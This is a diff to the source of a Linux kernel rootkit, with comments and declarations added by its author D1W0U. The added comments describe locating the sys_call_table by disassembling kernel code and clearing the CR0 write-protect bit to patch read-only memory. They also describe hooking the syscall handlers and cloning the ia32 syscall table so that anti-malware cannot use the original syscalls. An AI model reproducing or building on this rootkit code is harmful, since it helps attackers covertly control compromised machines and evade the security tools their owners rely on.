@@ -35,16 +35,29 @@
  * set_memory_rw() and "_ro() are implemented by searching change_page_attr_set_clr(),
  * inside set_memory_x() (which is exported, at least in v4.13).
  * But as we couldn't replace the holders of the sys_call_table, to point our own table, I did research.
- * And I found that disabling the 12th bit from CR0, we can write even if it's write-protected =).
+ * And I found that disabling the 16th bit from CR0, we can write even if it's write-protected =).
  *
  * Atm, the <>_fastpath label on the SYSCALL handler is not used. But it's located and hooked.
  * <>_slowpath is used, and could be also hooked.
  *
- * The interrupt 0x80 is still alive in x86_64, but only on compatibility mode.
- * So, to prevent an anti-malware to use the syscalls in the ia32_sys_call_table, that table is also
+ * The interrupt 0x80 is still alive in x86_64, but only on for compatibility.
+ * So, to prevent an anti-malware to use the original syscalls in the ia32_sys_call_table, that table is also
  * cloned and hooked.
  *
  * 24/01/2018 - D1W0U
+ *
+ * I modified the source to give support to the current available kernels in Ubuntu Xenial. And it's working for them all atm.
+ * Maybe in the future there's some new one, and still the rootkit doesn't support it.
+ * The ugly part of this project is to find the addresses where the sys_call_table is located. To execute syscalls.
+ * But also maybe some symbols becomes unexported in a future version, and that makes me to go mad in finding new ways... who knows!
+ * Now I'm going to implement the cloning and replacement of ia32_sct, and later I can start with the rootkit itself :)
+ *
+ * set_memory_rw and ro are commented as they're not used. But as it was work done, and maybe you find them useful, I'm leaving the code commented.
+ *
+ * Some commented code won't work in all kernel versions, and I had to remove some headers they're not in 4.8 nor 4.4. Also I had to reimplement __rdmsr() to my_rdmsr().
+ * As well as some other functions starting by my_, because not existent in older versions of the Linux Kernel. But everything seems ok in the specified versions in README.md notes.
+ *
+ * 28/01/2018 - D1W0U
  */
 
 #include <linux/vmalloc.h>
@@ -100,8 +113,17 @@
  */
 //void *readfile(const char *file, size_t *len);
 int disassemble(void *code, size_t code_len);
+/*
+ * this function takes the value of the address implied in the <inst> specified instruction, and also takes the address where the address is.
+ */
 void *disass_search_inst_addr(void *code, const char *inst, const char *fmt, size_t max, int position, void **location_addr);
+/*
+ * that does the same than before but searching for a specified opstr (which is the operand of a instruction in asm).
+ */
 void *disass_search_opstr_addr(void *addr, const char *opstr, const char *fmt, size_t max, int position, void **loc_addr);
+/*
+ * and the following one, the same, but the op addr must be in a range. Used for call/jmp, you can take the Nth instruction with a jump longitude specified.
+ */
 void *disass_search_inst_range_addr(void *addr, const char *inst, const char *fmt, size_t max, int position, unsigned long from, unsigned long to, void **loc_addr);
 void *search_sct_fastpath(unsigned int **psct_addr);
 void *search_sct_slowpath(unsigned int **psct_addr);
@@ -127,6 +149,9 @@ void * (*f__vmalloc_node_range)(unsigned long size, unsigned long align,
             pgprot_t prot, unsigned long vm_flags, int node,
             const void *caller) = NULL;
 
+/*
+ * those clears/sets the WP bit from CR0, to be able to disable the memory write protection.
+ */
 void disable_wp(void);
 void enable_wp(void);
 
@@ -156,6 +181,11 @@ int init_module(void)
     f_find_vpid = find_vpid;
     f_vscnprintf = vscnprintf;
 
+	/*
+     * uncomment this to be able to print into stdout/stderr with pinfo() and perr() functions, in dev mode.
+	 * the rootkit shouldn't use kallsyms_lookup_name in "production" kernels, I mean, it doesn't have to depend from finding symbols with this API because it's not always present.
+	 * Symbols from kallsyms not are always available. It's a configuration flag in kernel.
+	 */
 	f_sys_write = kallsyms_lookup_name("sys_write");
 
 	/*
